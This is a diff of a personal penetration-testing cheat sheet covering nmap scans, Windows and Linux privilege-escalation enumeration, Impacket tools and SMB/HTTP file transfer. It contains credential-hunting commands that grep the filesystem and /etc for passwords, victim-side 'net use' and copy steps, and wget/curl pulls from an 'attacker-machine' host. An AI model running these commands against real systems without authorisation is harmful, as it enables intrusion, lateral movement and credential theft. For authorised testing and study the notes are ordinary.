@@ -18,12 +18,13 @@
 ## Basic network
 - nmap (all ports)
   - script: locate -r nse$ | grep NAME
-  - sudo nmap -p- -Pn -sS -sV -PA -v -F --version-all $target -oA AllPort
+  - sudo nmap -p- -Pn -sS -sV -v --version-all $target -oA AllPort
   - sudo nmap -p -Pn -A $target -oA Services
   - sudo nmap -Pn -sV -sS -p --script vuln $target -oN Vuln.txt
     - -v Version
     - -A os, in-build scripts
     - -sC default scripts
+    - -F: fast mode, fewer ports
   - SSL scan
     - --script ssl*
 
@@ -75,11 +76,12 @@
     - [Environment]::Is64BitProcess
     - [Environment]::Is32itProcess
 - icalcs file = permission
-- Impackt
-  - /opt/impacket/
-    - smb: psexec.py
-    - MSQL
+
 - browser cache
+  - procdump (process)
+- RPC - 132
+  - rpcclient
+  - looksupsid.py
 - Enumerate register
 - scheduled task
 - UAC
@@ -93,6 +95,8 @@
   - icalcs
 - eventvwr
 - RCE admin: change user
+- Check files on user:
+  -  cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata
 - **Automatic scans**
   - winpeas
   - [privesc_check](https://github.com/pentestmonkey/windows-privesc-check)
@@ -100,6 +104,7 @@
   - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
   - [Peas Family](https://github.com/carlospolop/PEASS-ng/tree/master)
   - Empire modules:  /usr/share/powershell-empire/empire/server/modules/
+  - /usr/share/webshells 
 
 ### Kerberos
 - Enumerate
@@ -141,6 +146,12 @@
   - find / -type f -perm -04000 -ls 2>/dev/null 
   - find / -type f -perm -4000 -user root -ls 2>/dev/null
   - find / -type f -perm -u=s -user root -ls 2>/dev/null
+- Passwords:
+  - grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null
+  - grep --color=auto -rnw '/etc' -ie "Password" --color=always 2>/dev/null
+  - find /etc -type f -exec grep -i -I "pass" {} /dev/null \;
+
+
 - lscpu
 - lsblk -a
 - lsusb -v
@@ -168,6 +179,7 @@
 - export PATH=/tmp:$PATH = possible?
 
 ## Web
+- POST: check source code
 - dirb | dirsearch | gobuster | ffuz | wfuzz
   - wfuzz -c -u 'https:/target' -H "Host: FUZZ.target" -w WORDLIST--hh (hide/show)
   - gobuster -k (no tls validation) -w wordlist -x ext,ext,ext
@@ -212,10 +224,24 @@
 - **SMB**
   - Attacker
     - impacket-smbserver share $(pwd) -smb2support
+    - smbserver.py share .
+    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
   - Victim
+    - net use \\AttackingIP\share
+    - net use x: \\IP\share /user:USER PASS = send to drive X:
+    - copy file x:\
     - copy \\$attacker\share\file
+    - copy \\IP\\share\file.ext 
 - [Other methods](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
 
+
+- Impackt
+  - /opt/impacket/
+    - smb: psexec.py
+    - MSQL
+  - [More Info](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
+  - [Other info](https://www.coresecurity.com/core-labs/open-source-tools/impacket)
+  
 ### Linux
 - wget attacker-machine:8000:file.ext
 - curl attacker-machine:8000:file.ext
